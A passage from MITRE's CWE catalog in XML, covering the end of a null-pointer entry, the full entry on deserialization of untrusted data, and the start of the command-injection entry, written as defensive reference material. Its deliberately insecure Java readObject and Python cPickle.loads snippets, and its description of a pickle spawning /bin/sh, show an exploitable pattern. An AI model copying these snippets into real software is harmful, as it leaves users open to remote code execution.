               <Entry_Name>Denial of Service</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>EXP34-C</Entry_ID>
               <Entry_Name>Do not dereference null pointers</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP7</Entry_ID>
               <Entry_Name>Faulty Pointer Use</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1031"/>
            <Reference External_Reference_ID="REF-1032"/>
            <Reference External_Reference_ID="REF-1033"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Other_Notes, Potential_Mitigations, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Common_Consequences</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="502" Name="Deserialization of Untrusted Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.</Description>
         <Extended_Description>
            <xhtml:p>It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.</xhtml:p>
            <xhtml:p>Data that is untrusted can not be trusted to be well-formed.</xhtml:p>
            <xhtml:p>When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="915" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Name="JavaScript" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred ("serialization"), then extracting the serialized data to reconstruct the original object ("deserialization").</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Marshaling, Unmarshaling</Term>
               <Description>Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Pickling, Unpickling</Term>
               <Description>In Python, the "pickle" functionality is used to perform serialization and deserialization.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>PHP Object Injection</Term>
               <Description>Some PHP application researchers use this term when attacking unsafe use of the unserialize() function; but it is also used for CWE-915.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Unexpected State</Impact>
               <Note>Attackers can modify unexpected objects or data that was assumed to be safe from modification.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Note>If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Note>The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Explicitly define a final object() to prevent deserialization.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Make fields transient to protect them from deserialization.</xhtml:p>
                  <xhtml:p>An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code snippet deserializes an object from a file and uses it as a UI button:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">File file = new File("object.obj");<xhtml:br/>ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));<xhtml:br/>javax.swing.JButton button = (javax.swing.JButton) in.readObject();<xhtml:br/>in.close();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.</Body_Text>
               <Body_Text>To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private final void readObject(ObjectInputStream in) throws java.io.IOException {<xhtml:br/>throw new java.io.IOException("Cannot be deserialized"); }</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>class ExampleProtocol(protocol.Protocol):<xhtml:br/>def dataReceived(self, data):<xhtml:br/>
                           <xhtml:br/># Code that would be here would parse the incoming data<xhtml:br/># After receiving headers, call confirmAuth() to authenticate<xhtml:br/>
                           <xhtml:br/>def confirmAuth(self, headers):<xhtml:br/>try:<xhtml:br/>token = cPickle.loads(base64.b64decode(headers['AuthToken']))<xhtml:br/>if not check_hmac(token['signature'], token['data'], getSecretKey()):<xhtml:br/>raise AuthFail<xhtml:br/>self.secure_data = token['data']<xhtml:br/>except:<xhtml:br/>raise AuthFail</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object "AuthToken" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-12799</Reference>
               <Description>chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12799</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-8103</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-8103</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4852</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-4852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-1465</Reference>
               <Description>Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-1465</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3527</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system might allow code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-2520</Reference>
               <Description>Python script allows local users to execute code via pickled data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-2520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-4406</Reference>
               <Description>Unsafe deserialization using pickle in a Python script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-4406</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0791</Reference>
               <Description>Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0791</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Deserialization of untrusted data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER01-J</Entry_ID>
               <Entry_Name>Do not deviate from the proper signatures of serialization methods</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER03-J</Entry_ID>
               <Entry_Name>Do not serialize unencrypted, sensitive data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER06-J</Entry_ID>
               <Entry_Name>Make defensive copies of private mutable components during deserialization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER08-J</Entry_ID>
               <Entry_Name>Do not use the default serialized form for implementation defined invariants</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="586"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-461"/>
            <Reference External_Reference_ID="REF-462"/>
            <Reference External_Reference_ID="REF-463"/>
            <Reference External_Reference_ID="REF-464"/>
            <Reference External_Reference_ID="REF-465"/>
            <Reference External_Reference_ID="REF-466"/>
            <Reference External_Reference_ID="REF-467"/>
            <Reference External_Reference_ID="REF-468"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Modes_of_Introduction, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="77" Name="Improper Neutralization of Special Elements used in a Command ('Command Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Command injection vulnerabilities typically occur when:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>1. Data enters the application from an untrusted source.</xhtml:div>
               <xhtml:div>2. The data is part of a string that is executed as a command by the application.</xhtml:div>
